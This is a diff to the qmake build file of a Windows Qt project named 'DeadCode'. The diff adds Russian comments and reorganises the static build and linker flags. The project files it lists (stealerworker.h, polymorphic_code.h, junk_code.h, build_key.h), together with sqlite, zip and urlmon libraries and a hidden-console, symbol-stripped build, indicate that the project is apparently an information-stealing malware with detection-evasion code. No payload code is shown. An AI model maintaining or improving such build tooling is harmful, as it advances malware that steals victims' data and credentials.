@@ -1,17 +1,20 @@
+# Основные модули Qt
 QT += core gui network widgets
 
+# Имя приложения и тип проекта
 TARGET = DeadCode
 TEMPLATE = app
 
-# Добавляем параметры для статической сборки
-CONFIG += static
-CONFIG += staticlib
+# Настройки для статической сборки
+CONFIG += static staticlib
 QTPLUGIN += -
 
+# Исходные файлы
 SOURCES += \
     ../src/main.cpp \
     mainwindow.cpp
 
+# Заголовочные файлы
 HEADERS += \
     mainwindow.h \
     ../src/build_key.h \
@@ -19,16 +22,20 @@ HEADERS += \
     ../src/junk_code.h \
     ../src/stealerworker.h
 
+# Формы Qt Designer
 FORMS += mainwindow.ui
 
+# Ресурсы Windows (иконка)
 RC_FILE = ../icon.rc
 
+# Пути для поиска заголовков
 INCLUDEPATH += \
     ../src \
     . \
-    C:/vcpkg/installed/x64-mingw-static/include
+    $$system_path(C:/vcpkg/installed/x64-mingw-static/include)
 
-LIBS += -LC:/vcpkg/installed/x64-mingw-static/lib \
+# Библиотеки vcpkg и системные библиотеки Windows
+LIBS += -L$$system_path(C:/vcpkg/installed/x64-mingw-static/lib) \
         -lsqlite3 \
         -lzip \
         -lz \
@@ -51,42 +58,65 @@ LIBS += -LC:/vcpkg/installed/x64-mingw-static/lib \
         -lurlmon \
         -lole32
 
-QMAKE_CXXFLAGS += -O2 \
-                  -std=c++17 \
-                  -Wall \
-                  -Wextra \
-                  -Werror=return-type \
-                  -fexceptions \
-                  -DUNICODE \
-                  -D_UNICODE \
-                  -DWIN32 \
-                  -DQT_NO_DEBUG \
-                  -D_CRT_SECURE_NO_WARNINGS \
-                  -Wno-deprecated-declarations \
-                  -Wno-cast-function-type
+# Флаги компиляции
+QMAKE_CXXFLAGS += \
+    -O2 \
+    -std=c++17 \
+    -Wall \
+    -Wextra \
+    -Werror=return-type \
+    -fexceptions \
+    -DUNICODE \
+    -D_UNICODE \
+    -DWIN32 \
+    -DQT_NO_DEBUG \
+    -D_CRT_SECURE_NO_WARNINGS \
+    -DQT_DISABLE_DEPRECATED_BEFORE=0x050F00
 
-QMAKE_LFLAGS = -static-libgcc -static-libstdc++ -O2 -Wl,-s -Wl,-subsystem,windows -mthreads
+# Флаги линковки
+QMAKE_LFLAGS += \
+    -static \
+    -static-libgcc \
+    -static-libstdc++ \
+    -O2 \
+    -Wl,-s \
+    -Wl,-subsystem,windows \
+    -mthreads
 
-BUILD_DATE = $$system(powershell -Command "Get-Date -Format 'yyyy-MM-dd'")
+# Получение даты сборки
+BUILD_DATE = $$system(powershell -Command "Get-Date -Format 'yyyy-MM-dd'" 2> nul)
+isEmpty(BUILD_DATE) {
+    BUILD_DATE = $$system(date +%Y-%m-%d 2> /dev/null)
+}
 isEmpty(BUILD_DATE) {
     BUILD_DATE = "unknown"
 }
+
+# Получение версии сборки (хэш коммита)
 BUILD_VERSION = $$system(git rev-parse --short HEAD 2> nul)
 isEmpty(BUILD_VERSION) {
     BUILD_VERSION = "unknown"
 }
-DEFINES += BUILD_DATE=\\\"$${BUILD_DATE}\\\" \
-           BUILD_VERSION=\\\"$${BUILD_VERSION}\\\"
 
+# Определения для кода
+DEFINES += \
+    BUILD_DATE=\\\"$${BUILD_DATE}\\\" \
+    BUILD_VERSION=\\\"$${BUILD_VERSION}\\\"
+
+# Директории для сборки
 DESTDIR = ../build
 OBJECTS_DIR = ../release
 MOC_DIR = ../release
 UI_DIR = ../release
 
+# Очистка временных файлов
 QMAKE_CLEAN += \
     ../build/DeadCode.exe \
-    ../release/*.o
+    ../release/*.o \
+    ../release/Makefile* \
+    ../release/ui_*.h
 
+# Настройки для debug-режима
 win32 {
     CONFIG(debug, debug|release) {
         QMAKE_CXXFLAGS += -g
@@ -94,6 +124,7 @@ win32 {
     }
 }
 
+# Зависимости перед сборкой
 PRE_TARGETDEPS += \
     ../src/build_key.h \
     ../src/polymorphic_code.h \
